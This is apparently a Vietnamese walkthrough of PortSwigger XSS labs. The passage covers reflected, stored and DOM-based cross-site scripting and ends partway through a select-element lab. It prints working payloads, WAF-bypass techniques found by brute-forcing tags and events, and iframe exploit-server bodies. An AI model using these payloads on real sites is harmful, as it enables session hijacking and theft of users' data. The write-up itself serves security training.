---
title: XSS
category: web
tags:
  - XSS
  - Reflected XSS
  - Stored XSS
  - DOM XSS
  - PortSwigger
---

# Introduction
Có thể tìm hiểu thêm thông qua link [PortSwigger](https://portswigger.net/web-security/cross-site-scripting) này

[Link](https://medium.com/@godsxfinger/useful-javascript-functions-apis-to-exploit-xss-cross-site-scripting-5d99a93d9899) chứa một vài hàm JS hữu ích và API để khai thác XSS

[Cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
# Labs
## Reflected XSS into HTML context with nothing encoded
#### Đề bài  

This lab contains a simple reflected cross-site scripting vulnerability in the search functionality.

To solve the lab, perform a cross-site scripting attack that calls the `alert` function.

#### Solution

Truy cập vào lab, ta thấy web có phần search như này

![image](https://hackmd.io/_uploads/rkXjC8r5Mg.png)

Thử nhập payload vào để xem cách code hoạt động, ta bắt đầu với `1`, nhận được giao diện như sau
![image](https://hackmd.io/_uploads/HJVSTS5Kfe.png)

Ta nhận thấy input của user đã được chèn vào ở đoạn này của source
``` html 
<section class=blog-header>
    <h1>0 search results for '1'</h1>
    <hr>
</section>
```

Vậy ta có thể lợi dụng chỗ này để chèn một đoạn html để thực hiện code JS nhằm chạy hàm `alert`

-> Payload: `<script>alert(1)</script>`

```html
<section class=blog-header>
    <h1>0 search results for '<script>alert(1)</script>'</h1>
    <hr>
</section>
```
## Reflected XSS into attribute with angle brackets HTML-encoded
#### Đề bài
This lab contains a reflected cross-site scripting vulnerability in the search blog functionality where angle brackets are HTML-encoded. To solve this lab, perform a cross-site scripting attack that injects an attribute and calls the `alert` function.
#### Solution 
Truy cập vào lab ta thấy giao diện như sau: 
![image](https://hackmd.io/_uploads/H1y-YZPuMx.png)
Thử nhập payload là `1` ta có source code, ta thấy input của user đã được inject ở đoạn code sau 
```html!
<input type=text placeholder='Search the blog...' name=search value="1">
```
Vì dấu `<>` đã bị encoded nên không thể chèn element mới vào, ta phải tận dụng tag input có sẵn để kích hoạt event

![image](https://hackmd.io/_uploads/rJRfYWDOzl.png)


-> Payload: `" onmouseover="alert(1)`
1. `"` để đóng attribute `value`
2. `onmouseover="alert(1)` để tận dụng `">` còn dư có sẵn trong source code
```html!
<input type=text placeholder='Search the blog...' name=search value="" onmouseover="alert(1)">
```

Lúc này, khi di chuột đến ô tìm kiếm thì sẽ trigger event `alert`
## Reflected XSS into a JavaScript string with angle brackets HTML encoded
#### Đề bài
This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets are encoded. The reflection occurs inside a JavaScript string. To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the `alert` function.
#### Solution
Truy cập vào lab, ta thấy:
![image](https://hackmd.io/_uploads/r1aMcZDOzx.png)
Nhập thử payload là `1`, ta có được source code, đoạn code cần lưu ý:
```html!
<script>
    var searchTerms = '1';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```
Vì `'<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">'` có `searchTerms` đã được encode nên ta phải sử dụng input ở `var searchTerms = '1';`
###### Cách 1
-> Payload: `'; alert(1); var a='`
1. `';` để thoát khỏi `searchTerms`
2. `alert(1);` để thực hiện hàm `alert`
3. `var a='` để tận dụng `';` còn dư
```html!
<script>
    var searchTerms = ''; alert(1); var a='';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```
###### cách 2
Cũng tương tự như cách 1 nhưng thay vì tạo hàm mới, ta biến `';` trở thành comment bằng `//` ở trong JS, tương tự `#` trong Python
-> Payload: `'; alert(1); //'`
```html!
<script>
    var searchTerms = ''; alert(1); //;
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>

```
###### Cách 3
-> Payload: `'-alert(1)-'`
1. `'` để '' thành rỗng
2. `-`là toán tử trừ
3. `alert(1)` là hàm alert
4. `-` là toán tử trừ
5. `'` để ''; thành rỗng và kết thúc câu lệnh

-> Coi như biến `searchTerms` là 1 số vì JavaScript coi đây như một phép tính: chuỗi rỗng - kết quả của alert(1) - chuỗi rỗng
:::warning
Khi dùng toán tử trừ, JavaScript có cơ chế tự động chuyển kiểu
=> `''` = 0
=> `alert(1)` = NaN (not a number) 
bước này JavaScript chạy hàm để lấy giá trị trả về rồi biến đổi biểu thức thành NaN nên đã kích hoạt `alert`
=> `''` = 0
:::
```html!
<script>
    var searchTerms = ''-alert(1)-'';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```

## Reflected XSS into HTML context with most tags and attributes blocked
#### Đề bài
This lab contains a reflected XSS vulnerability in the search functionality but uses a web application firewall (WAF) to protect against common XSS vectors.

To solve the lab, perform a cross-site scripting attack that bypasses the WAF and calls the print() function.

:::warning 
Your solution must not require any user interaction. Manually causing print() to be called in your own browser will not solve the lab.
:::
#### Solution
Truy cập vào lab, ta thấy:
![image](https://hackmd.io/_uploads/B1f5FXjdfe.png)
Thử nhập payload là `<script>print()</script>` ta nhận thấy tag đã bị chặn với output: `"Tag is not allowed"`

Vì vậy ta phải bruteforce các tag để xem tag nào dùng được
Mở BurpSuite lên và vào Intruder

![image](https://hackmd.io/_uploads/SkLaQyndMe.png)

Ta thay thế payload như sau `<§§>` để bruteforce
![image](https://hackmd.io/_uploads/rkUNN13dGg.png)
Ta truy cập [cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) của PortSwigger để lấy tất cả tag để dán rồi tấn công

Sau khi tấn công, ta có danh sách như sau:
![image](https://hackmd.io/_uploads/ByVLPJhdzl.png)
Filter các tag load thành công với status 200 có `body`
![image](https://hackmd.io/_uploads/S1pKDJ3_Gg.png)

Tiếp tục truy cập [cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) và lựa chọn tất cả event đem đi bruteforce với payload sau: `<body §§=1>` rồi Ctrl+U thành `<body+§§%3d1>`

Sau khi tấn công, ta có danh sách đã lọc như sau:
`onbeforeinput`, `onbeforematch`, `onbeforetoggle`, `oncancel`, `oncommand`, `oncontentvisibilityautostatechange`, `oncontentvisibilityautostatechange(hidden)`, `ondragexit`, `onformdata`, `ongesturechange`, `ongestureend`, `ongesturestart`, `ongotpointercapture`, `onlocation`, `onlostpointercapture`, `onpagereveal`, `onpageswap`, `onpointercancel`, `onpromptaction`, `onpromptdismiss`, `onratechange`, `onresize`, `onscrollend`, `onscrollsnapchange`, `onscrollsnapchanging`, `onsecuritypolicyviolation`, `onslotchange`, `onsuspend`, `ontouchcancel`, `onvalidationstatuschange`, `onwebkitfullscreenchange`, `onwebkitmouseforcechanged`, `onwebkitmouseforcedown`, `onwebkitmouseforceup`, `onwebkitmouseforcewillbegin`, `onwebkitneedkey`, `onwebkitplaybacktargetavailabilitychanged`, `onwebkitpresentationmodechanged`

Với mỗi event, ta đều cần các điều kiện trigger event khác nhau. 
Ta nhận thấy event `onresize` là thích hợp nhất 
-> Payload: `<body onresize=print()>`

Ta có link URL chứa mã độc như sau:
`https://0a03007e03de726281f602880052002b.web-security-academy.net/?search=%3Cbody+onresize%3Dprint%28%29%3E`

Để trigger event thì ta phải load trước cửa sổ, sau đó đổi kích thước của cửa sổ khi load thành công -> sử dụng tag `iframe`

Truy cập exploit server:
![image](https://hackmd.io/_uploads/ryu2Wg2_fg.png)

-> Payload: 
```html!
<iframe src= "https://0a03007e03de726281f602880052002b.web-security-academy.net/?search=%3Cbody+onresize%3Dprint%28%29%3E" onload="this.height=100"></iframe>
```
->
```html!
<iframe src= "https://0a03007e03de726281f602880052002b.web-security-academy.net/?search=%3Cbody+onresize%3Dprint%28%29%3E" height = "100"></iframe>
```
Hoặc payload:
```html!
<iframe src= "https://0a03007e03de726281f602880052002b.web-security-academy.net/?search=%3Cbody+onresize%3Dprint%28%29%3E" onload="this.style.height='100px'"></iframe>
```
->
```html!
<iframe src= "https://0a03007e03de726281f602880052002b.web-security-academy.net/?search=%3Cbody+onresize%3Dprint%28%29%3E" style="height: 100px"></iframe>
```
## Reflected XSS into HTML context with all tags blocked except custom ones
#### Đề bài
This lab blocks all HTML tags except custom ones.

To solve the lab, perform a cross-site scripting attack that injects a custom tag and automatically alerts `document.cookie`.
#### Solution
Vì lab này ban hết tất cả các tag ngoại trừ tag custom nên ta sử dụng tag custom 

Custom tag được chia làm 2 loại: 
1. [autonomous custom element](https://html.spec.whatwg.org/dev/custom-elements.html#autonomous-custom-element)
2. [customized built-in element](https://html.spec.whatwg.org/dev/custom-elements.html#customized-built-in-element)

Vì `autonomous custom element` thuộc `phrasing content` hoạt động như `<span>`,`<area>`,... 

Sử dụng [cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) ta thấy có thể sử dụng event sau để tự động kích hoạt `alert` `document.cookie`
![image](https://hackmd.io/_uploads/S1LLBsUFfe.png)
-> `<my-tag onfocus=alert(document.cookie) autofocus tabindex=1></my-tag>`
1. `onfocus=alert(document.cookie)` -> Khi element này được focus sẽ thực hiện lệnh JS ở trong
2. `tabindex=1` -> Làm cho element có khả năng nhận focus (Khi nhấn tab thì sẽ focus vào element này đầu tiền vì có index=1)
3. `autofocus` -> Tự động focus vào element này
Trước tiên ta thử payload sử dụng tag`<iframe>` như thông thường để nhúng trang chứa mã độc 

-> Payload:
```html!
<iframe src="https://0aec004b04565d43809e17bf00610069.web-security-academy.net/?search=<my-tag onfocus=alert(document.cookie) autofocus tabindex=1></my-tag>"></iframe>
```
Nhận thấy đã bị chặn![image](https://hackmd.io/_uploads/r1DNPoUtMl.png)
Ta sử dụng payload khác với tag `script`
-> Payload:
```html!
<script> location.href="https://0aec004b04565d43809e17bf00610069.web-security-academy.net/?search=<my-tag onfocus=alert(document.cookie) autofocus tabindex=1></my-tag>"</script>
```
## Reflected XSS with some SVG markup allowed
#### Đề bài 
This lab has a simple reflected XSS vulnerability. The site is blocking common tags but misses some SVG tags and events.

To solve the lab, perform a cross-site scripting attack that calls the `alert()` function.
#### Solution 
Vì đề bài cho ta biết chỉ có một vài `SVG markup` được cho phép nên ta sử dụng Burp Intruder để bruteforce tags
Thu được bảng sau:
![image](https://hackmd.io/_uploads/SJ0f028YMx.png)
Ta thấy `animatetransform` và `svg` nhận về status code = 200 nên truy câp [cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) và xem cấu trúc của payload
![image](https://hackmd.io/_uploads/ry3BlaUFGe.png)
```html!
<svg><animatetransform onbegin=alert(1) attributeName=transform>
```
Ta thử nhập payload ở trên vào, nếu lab chưa được solve thì ta vào Burp Intruder vào chạy bruteforce các events

May mắn thay, payload trên lại hoạt động một cách hoàn hảo và solve bài lab

Trong trường hợp vẫn muốn check xem có thể dùng attribute khác:
![image](https://hackmd.io/_uploads/B1fY_p8KGg.png)
Thu được kết quả
![image](https://hackmd.io/_uploads/BkmBO6LYfx.png)
Ta nhận thấy chỉ có attribute `onbegin` trả về status code = 200 
-> Payload:
```html!
<svg><animatetransform onbegin=alert(1) attributeName=transform>
```
## Reflected XSS in canonical link tag
#### Đề bài 
This lab reflects user input in a canonical link tag and escapes angle brackets.

To solve the lab, perform a cross-site scripting attack on the home page that injects an attribute that calls the `alert` function.

To assist with your exploit, you can assume that the simulated user will press the following key combinations:
```
ALT+SHIFT+X
CTRL+ALT+X
Alt+X
```
Please note that the intended solution to this lab is only possible in Chrome.
#### Solution
Ta thử payload `https://0a5f00a6043b11ff80600332000e0011.web-security-academy.net/?1` và quan sát source code ta thấy input của user được chèn ở đây.
```html!
<link rel="canonical" href='https://0a5f00a6043b11ff80600332000e0011.web-security-academy.net/?1'/>
```

Theo đề bài, ta có `canonical link tag and escapes angle brackets`:
1. input của user nằm trong `HTML attribute context` nên ta cần tìm cách thoát ra 
2. `escapes angle brackets` nên không thể tạo element mới để XSS

-> Ta phải thoát khỏi attribute `href` và tận dụng tag `<link>` để thêm attribute phù hợp

Mà đề bài giả sử user sẽ nhấn các tổ hợp phím `ALT+SHIFT+X`, `CTRL+ALT+X`, `Alt+X`
Đi research thì ta tìm thấy được một attribute phù hợp là [accesskey](https://www.w3schools.com/tags/att_accesskey.asp) thuộc biến toàn cục nên có thể sử dụng trên mọi HTML element 

-> Payload: 
`https://0a5f00a6043b11ff80600332000e0011.web-security-academy.net/?'accesskey='x'onclick='alert(1)`

```html!
<link rel="canonical" href='https://0a5f00a6043b11ff80600332000e0011.web-security-academy.net/?'accesskey='x'onclick='alert(1)'>
```
1. `'` để đóng attribute `href`
2. `accesskey='x'` để gán phím tắt cho tổ hợp phím `Alt`+`x`
3. `onclick=` để trigger lệnh JS khi điều kiện của event `onclick` được thỏa mãn bởi `accesskey`
4. `'alert(1)` để tận dụng `'>` còn dư của source
>`onclick` không nhất thiết phải do chuột click. HTML activation có thể được thực hiện bởi các cơ chế khác, trong đó `accesskey` là một cách kích hoạt element. Đây chính là lý do lab này có thể dùng `accesskey` + `onclick` dù `<link>` không phải một cái link để bạn click như `<a>`.

## Reflected XSS into a JavaScript string with single quote and backslash escaped
#### Đề bài 
This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality. The reflection occurs inside a JavaScript string with single quotes and backslashes escaped.

To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the `alert` function.
#### Solution
Nhập thử payload `1` để quan sát input của user được đặt ở đâu trong source code:
```html!
<script>
    var searchTerms = '1';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```
Nhận thấy input đã được đặt vào trong đoạn JS string, ta thử payload `';alert(1);//` 
Quan sát thấy ' đã được escape nên không thoát khỏi JS string được
```Javascript!
var searchTerms = '\';alert(1);//';
```
Ta nhập thử payload `<script>alert(1)</script>` kinh điển thì thấy được hiện tượng bất thường ![image](https://hackmd.io/_uploads/rJMh4xKKMg.png)
Ta quay lại source code thấy như sau
```html!
<script>
    var searchTerms = '<script>alert(1)</script>';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```
Chứng tỏ `</script>` đã đóng tag `<script>` ở trên và thoát ra ngoài JS string 

-> Payload:
`</script><script>alert(1)</script>`
1. `</script>` để thoát khỏi JS string
2. `<script>alert(1)</script>` để thực thi hàm `alert(1)`
## Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped
#### Đề bài 
This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets and double are HTML encoded and single quotes are escaped.

To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the `alert` function.
#### Solution 
Nhập thử `'` ta thấy đã được escape thành `\'` 
Mà lab này lại không encode `\`, vì vậy ta trick parser bằng cách thêm `\` vào trước `'` -> `\\'` 
```html!
<script>
    var searchTerms = '\\'';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```
Lúc này thì `\\` được parser hiểu là `\` và để lại `'` để thoát khỏi câu lệnh JS

-> Payload:
`\';alert(1);//'`
1. `\';` để thoát khỏi JS string
2. `alert(1);` để thực hiện hàm `alert`
3. `//` để biến phần `';` trở thành command và không gây lỗi
```html!
<script>
    var searchTerms = '\\';alert(1);//';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```
## Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped
#### Đề bài 
This lab contains a reflected cross-site scripting vulnerability in the search blog functionality. The reflection occurs inside a template string with angle brackets, single, and double quotes HTML encoded, and backticks escaped. To solve this lab, perform a cross-site scripting attack that calls the `alert` function inside the template string.
#### Solution 
Theo đề bài, ta cần phải gọi hàm `alert` bên trong `template string` mà không cần phải thoát ra

Vậy `template string` hay `template literal`là gì?

[Template string](https://www.w3schools.com/Js/js_string_templates.asp) là một string sử dụng \` thay vì " hay ', cho phép thêm expressions vào chuỗi với cú pháp ${...}

Một câu hỏi mới được sinh ra, `expressions` là gì?

[Expressions](https://www.joshwcomeau.com/javascript/statements-vs-expressions/#expressions-1), về cơ bản,  là một đoạn mã JavaScript trả về một giá trị.

-> Payload: `${alert(1)}`
```javascript!
var message = `1 search results for '${alert(1)}'`;
```
Payload này có cơ chế khá tương tự với việc sử dụng toán tử đệm để parser evaluate `alert(1)` và chạy hàm. Khi `alert` nằm trong `${...}`, hàm sẽ chạy để trả lại giá trị, ở trường hợp này thì giá trị là `undefined`
![image](https://hackmd.io/_uploads/ByGInB5Fzl.png)

## Stored XSS into HTML context with nothing encoded
#### Đề bài
This lab contains a stored cross-site scripting vulnerability in the comment functionality.

To solve this lab, submit a comment that calls the alert function when the blog post is viewed.
#### Solution 
Truy cập vào lab ta thấy như sau:
![image](https://hackmd.io/_uploads/HJEmXPSczl.png)
Để tìm chỗ nhập comment, ta view post
![image](https://hackmd.io/_uploads/SyuhudH9zx.png)
Nhập thử payload `1`, ta có được source code, ta thấy input của user đã được chèn vào ở đoạn sau:
```html 
<section class="comment">
    <p>
    <img src="/resources/images/avatarDefault.svg" class="avatar">                            1 | 02 September 2026
    </p>
    <p>1</p>
    <p></p>
</section>
```
Vậy ta có thể lợi dụng chỗ này để chèn một đoạn html để thực hiện code JS nhằm chạy hàm `alert`

-> Payload: `<script>alert(1)</script>`

```html 
<section class="comment">
    <p>
    <img src="/resources/images/avatarDefault.svg" class="avatar">                            1 | 02 September 2026
    </p>
    <p><script>alert(1)</script></p>
    <p></p>
</section>
```
## Stored XSS into anchor `href` attribute with double quotes HTML-encoded
#### Đề bài 
This lab contains a stored cross-site scripting vulnerability in the comment functionality. To solve this lab, submit a comment that calls the `alert` function when the comment author name is clicked.
#### Solution 
Truy cập lab, ta thấy:
![image](https://hackmd.io/_uploads/ryJAo-D_zg.png)
View post ta thấy phần để nhập comment
![image](https://hackmd.io/_uploads/BJE1n-DuGe.png)
Nhập thử payload sau và quan sát source code
![image](https://hackmd.io/_uploads/BkAxnbPOMx.png)
Đoạn code cần lưu ý:
```html!
<section class="comment">
    <p>
    <img src="/resources/images/avatarDefault.svg" class="avatar">                            <a id="author" href="/s">1</a> | 03 September 2026
    </p>
    <p>1</p>
    <p></p>
</section>
```
`<a id="author" href="/s">1</a>`
"when the comment author name is clicked" -> sử dụng `href` để chèn mã độc 
![image](https://hackmd.io/_uploads/rkUMnbwdMx.png)
input của user tại mục website đã được inject vào trong attribute `href` -> Ta sử dụng `javascript:` để chèn lệnh JS vào

-> Payload: `javascript:alert(1)`
## Stored XSS into `onclick` event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped
#### Đề bài
This lab contains a stored cross-site scripting vulnerability in the comment functionality.

To solve this lab, submit a comment that calls the `alert` function when the comment author name is clicked.
#### Solution
Nhập thử các payload cơ bản để store![image](https://hackmd.io/_uploads/SJJp-oFFMg.png)
Ta thấy input của user ở đoạn code sau:
```html!
<section class="comment">
    <p>
    <img src="/resources/images/avatarDefault.svg" class="avatar">                            <a id="author" href="http://1" onclick="var tracker={track(){}};tracker.track('http://1');">1</a> | 17 September 2026
    </p>
    <p>1</p>
    <p></p>
</section>
```
Theo đề, ta có `<`,`>` và `"` bị HTML encode nên KHÔNG THỂ dùng để đóng các attribute như `href` hay `onclick` hay chèn tag mới
>Sau khi được HTML decoding thì chỉ có thể dùng để thoát khỏi các câu lệnh JS nằm bên trong attribute chứ không thể đóng attribute hay tag

`'` và `\` được escaped để tránh sử dụng để đóng `tracker.track` và thoát khỏi JS string nhằm chèn JS

Thế nhưng, `'` và `\` dưới dạng [HTML entity](https://www.toptal.com/designers/htmlarrows/punctuation/) thì vẫn được coi như là bình thường và có thể đóng được lệnh JS nằm trong attribute `onclick`

Vì vậy ta có thể thay `'` bằng `&apos;`
Hoặc nếu muốn, có thể thay `'` bằng `&bsol;'` -> `\\'` nên để lại dấu `'` có tác dụng thoát khỏi JS string
-> Payload:
`http://&apos;-alert(1)-&apos;`
`http://&apos;);alert(1);(&apos;`
`http://&bsol;');alert(1);(&apos;`

> Nếu thắc mắc tại sao không thể dùng payload `http://&bsol;');alert(1);(&bsol;'` thì 
> ```javascript!
> var tracker={track(){}};
> tracker.track('http://&bsol;\');alert(1);(&bsol;\'');
> ```
> Sau khi HTML decoding
> ```javascript!
> var tracker={track(){}};
>tracker.track('http://\\');alert(1);(\\'');
>```
>Các phần đầu đã làm tốt nhiệm vụ của nó, nhưng mà `(\\'');` lại gây ra lỗi vì ở vị trí này bạn đã ở ngoài string, nên `\` không còn được dùng như escape character của string nữa. Nó khiến JavaScript parser gặp syntax không hợp lệ.
## DOM XSS in `document.write` sink using source `location.search`
#### Đề bài
This lab contains a DOM-based cross-site scripting vulnerability in the search query tracking functionality. It uses the JavaScript `document.write` function, which writes data out to the page. The `document.write` function is called with data from `location.search`, which you can control using the website URL.

To solve this lab, perform a cross-site scripting attack that calls the `alert` function.
#### Solution 
Truy cập vào lab ta thấy giao diện 
![image](https://hackmd.io/_uploads/ryL9GwBqGx.png)

Thử nhập payload `1` ta thấy source code như sau, đoạn code cần lưu ý:
```html 
<script>
    function trackSearch(query) {
        document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
    }
    var query = (new URLSearchParams(window.location.search)).get('search');
    if(query) {
        trackSearch(query);
    }
</script>
```
Ta nhận thấy input của user sẽ được chèn vào thông qua `query`
```javascript!
document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">')
```
mà `query` được lấy từ `window.location.search` trên URL thông qua câu lệnh 
```javascript!
var query = (new URLSearchParams(window.location.search)).get('search');
```

Như ví dụ ở này thì `URLSearchParams` nhận cả `?search=1`, sau đó `.get('search')` lấy ra `"1"`:
1. `URLSearchParams(window.location.search)` = `?search=1`
2. `URLSearchParams(window.location.search)).get('search')` = `"1"`
3. `query` = `"1"`
```
https://0a9100ad0330854880945eb100160059.web-security-academy.net/?search=1
```
![image](https://hackmd.io/_uploads/HyI3zPH9Mg.png)

Từ đó ta có 
```javascript!
document.write('<img src="/resources/images/tracker.gif?searchTerms='+'1'+'">')
```
Hay
```html!
<img src="/resources/images/tracker.gif?searchTerms=1">
```
Vì ở đây sử dụng element `img` và attribute `src` sẽ được load thành công nên ta sẽ nghĩ tới event `onload` để kích hoạt `alert`

-> Payload: `" onload="alert(1)`
`"` để đóng attribute `src`
`onload="alert(1)` để tận dụng `">` còn dư của source

Từ đó, ta có
```javascript!
document.write('<img src="/resources/images/tracker.gif?searchTerms='+'" onload="alert(1)'+'">')
```
Hay 
```html!
<img src="/resources/images/tracker.gif?searchTerms=" onload="alert(1)">
```
## DOM XSS in `innerHTML` sink using source `location.search`
#### Đề bài 
This lab contains a DOM-based cross-site scripting vulnerability in the search blog functionality. It uses an `innerHTML` assignment, which changes the HTML contents of a `div` element, using data from `location.search`.

To solve this lab, perform a cross-site scripting attack that calls the `alert` function.
#### Solution 
Truy cập vào lab, ta thấy:

![image](https://hackmd.io/_uploads/rk_azPH9Gx.png)

Nhập thử payload `1` ta có source code, đoạn code cần lưu ý:
```html!
<section class=blog-header>
    <h1><span>1 search results for '</span><span id="searchMessage"></span><span>'</span></h1>
    <script>
        function doSearchQuery(query) {
            document.getElementById('searchMessage').innerHTML = query;
        }
        var query = (new URLSearchParams(window.location.search)).get('search');
        if(query) {
            doSearchQuery(query);
        }
    </script>
    <hr>
</section>
```
Ta nhận thấy input của user sẽ được chèn vào thông qua việc thay đổi `<span id="searchMessage"></span>` theo `query`
```html!
<h1><span>1 search results for '</span><span id="searchMessage"></span><span>'</span></h1>
    <script>
        function doSearchQuery(query) {
            document.getElementById('searchMessage').innerHTML = query;
        }
```
mà `query` được lấy từ `window.location.search` trên URL thông qua câu lệnh 
```javascript!
var query = (new URLSearchParams(window.location.search)).get('search');
```

Như ví dụ ở này thì `URLSearchParams` nhận cả `?search=1`, sau đó `.get('search')` lấy ra `"1"`:
1. `URLSearchParams(window.location.search)` = `?search=1`
2. `URLSearchParams(window.location.search)).get('search')` = `"1"`
3. `query` = `"1"`
```
https://0a9100ad0330854880945eb100160059.web-security-academy.net/?search=1
```
Câu lệnh dưới để thay đổi nội dung HTML của id=`searchMessage` tại `<h1><span>1 search results for '</span><span id="searchMessage"></span><span>'</span></h1>`

![image](https://hackmd.io/_uploads/S1hCzPSqze.png)

```javascript!
document.getElementById('searchMessage').innerHTML = query;
```
Từ đó ta có thể chèn code HTML để thực hiện `alert` thay vì text thông thường

>Lưu ý: innerHTML không thực hiện code JS trong `<script></script>` nên ta phải tìm hướng đi khác

-> Payload: `<img src="x" onerror="alert(1)">`
1. Hình ảnh với `src="x"` sẽ không thể load được
2. Sử dụng event `onerror` để chèn code JS 
## DOM XSS in jQuery anchor `href` attribute sink using `location.search` source
#### Đề bài 
This lab contains a DOM-based cross-site scripting vulnerability in the submit feedback page. It uses the jQuery library's `$` selector function to find an anchor element, and changes its `href` attribute using data from `location.search`.

To solve this lab, make the "back" link alert `document.cookie`.
#### Solution 
Truy cập vào lab, ta thấy như sau:
![image](https://hackmd.io/_uploads/SJgIajUdMl.png)
Truy cập page Submit feedback
![image](https://hackmd.io/_uploads/rJUD6oIufe.png)
Ta nhận được source code, đoạn code cần lưu ý:
```html!
<div class="is-linkback">
    <a id="backLink">Back</a>
</div>
<script>
    $(function() {
        $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
    });
</script>
```

Sử dụng phương pháp location.search để lấy `parameter` returnPath trên URL:
```javascript!
URLSearchParams(window.location.search)).get('returnPath')
```
Rồi gắn URL vào attribute `href` cho `id` "backLink" nằm ở 
`<a id="backLink">Back</a>`
```javascript!
$(function() {
        $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
    });
```
mà URL có thể chèn script vào để thực hiện `alert`
![image](https://hackmd.io/_uploads/HyQFAsI_fg.png)
-> URL: 
`https://0a8a004004c989a680d644b3007f00b4.web-security-academy.net/feedback?returnPath=javascript:alert(document.cookie)`

Từ đó khi nhấn vào nút Back, sẽ hiện cookie
## DOM XSS in jQuery selector sink using a hashchange event
#### Đề bài 
This lab contains a DOM-based cross-site scripting vulnerability on the home page. It uses jQuery's `$()` selector function to auto-scroll to a given post, whose title is passed via the `location.hash` property.

To solve the lab, deliver an exploit to the victim that calls the `print()` function in their browser.
#### Solution 
Truy cập vào lab ta có source code sau, đoạn code cần lưu ý:
```html!
<script>
    $(window).on('hashchange', function(){
        var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
        if (post) post.get(0).scrollIntoView();
    });
</script>
```
Phân tích:
1. `(window).on('hashchange', function(){})` 
-> khi có sự thay đổi ở URL sẽ chạy hàm trong `function`
2. `var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');`
-> Ở `section.blog-list`, lấy tất cả element `<h2>` có chứa `decodeURIComponent(window.location.hash.slice(1))` là text nằm ngay sau dấu # ở URL 
3. `if (post) post.get(0).scrollIntoView();`
-> `post` nếu gồm nhiều đoạn có text đang tìm thì `post.get(0)` sẽ chọn đoạn đầu tiên rồi cuộn đến thông qua `.scrollIntoView()`

Vậy input của user sẽ ở `window.location.hash.slice(1)`, từ đó thông qua `$()` chèn payload khiển jQuery selector xử lí như HTML và tạo element 
-> URL: `https://0a8700cf0337668b8009581f00e900ae.web-security-academy.net/#<img src='x' onerror='print()'>`

:::warning
Lab này không sử dụng được `<script>print()</script>` vì tag này đã bị encode
![image](https://hackmd.io/_uploads/BySju9Udze.png)
:::

Truy cập vào exploit server:
![image](https://hackmd.io/_uploads/SJHLFqIOfl.png)
Đầu tiên, để có được event hashchange, ta cần load 1 trang, sau đó chuyển trang khác, vì vậy ta dùng element `iframe` để load sẵn trang 1 rồi sử dụng onload để chuyển đến trang có chứa mã độc 

Ta thử nhập payload như sau:
```html!
<iframe src="https://0a8700cf0337668b8009581f00e900ae.web-security-academy.net/#" onload="this.src += '<img src='x' onerror='print()'> ' "> </iframe>
```
Lúc này ta bấm thử View Exploit thì sẽ không thành công bởi vì đã có sự trùng kí tự dấu nháy dẫn tới việc HTML được parse sai cách: 
`'<img src='` ; `'onerror='` ; `'> '`

Vậy ta phải bỏ đi dấu nháy đơn ở `src='x'` và `onerror='print()'` vì `x` và `print()` không có dấu space ở giữa nên không cần `''` để xác định

-> Đây sẽ là Body đúng để gửi đến nạn nhân:
```html!
<iframe src="https://0a8700cf0337668b8009581f00e900ae.web-security-academy.net/#" onload="this.src += '<img src=x onerror=print()> ' "></iframe>
```

:::warning
Vì src là 1 string nên this.src cũng phải cộng 1 string, vì vậy ta không thể bỏ dấu nháy đơn ở `this.src += '...'`
:::
## DOM XSS in `document.write` sink using source `location.search` inside a select element
#### Đề bài 
This lab contains a DOM-based cross-site scripting vulnerability in the stock checker functionality. It uses the JavaScript `document.write` function, which writes data out to the page. The `document.write` function is called with data from `location.search` which you can control using the website URL. The data is enclosed within a select element.

To solve this lab, perform a cross-site scripting attack that breaks out of the select element and calls the `alert` function.
#### Solution 
Truy cập vào lab, ta thấy:
![image](https://hackmd.io/_uploads/HJx64zXv_fg.png)
View details
![image](https://hackmd.io/_uploads/Syu8f7P_zg.png)
Check stocks
![image](https://hackmd.io/_uploads/S1y_fQPuMl.png)

Ta có source code, đoạn code cần lưu ý:
```html!
<script>
    var stores = ["London","Paris","Milan"];
    var store = (new URLSearchParams(window.location.search)).get('storeId');
    document.write('<select name="storeId">');
    if(store) {
        document.write('<option selected>'+store+'</option>');
    }
    for(var i=0;i<stores.length;i++) {
        if(stores[i] === store) {
            continue;
        }
        document.write('<option>'+stores[i]+'</option>');
    }
    document.write('</select>');
</script>
```
Đoạn code trên tạo đoạn code HTML:
```html!
<select name="storeId">
    <option selected>+store+</option>
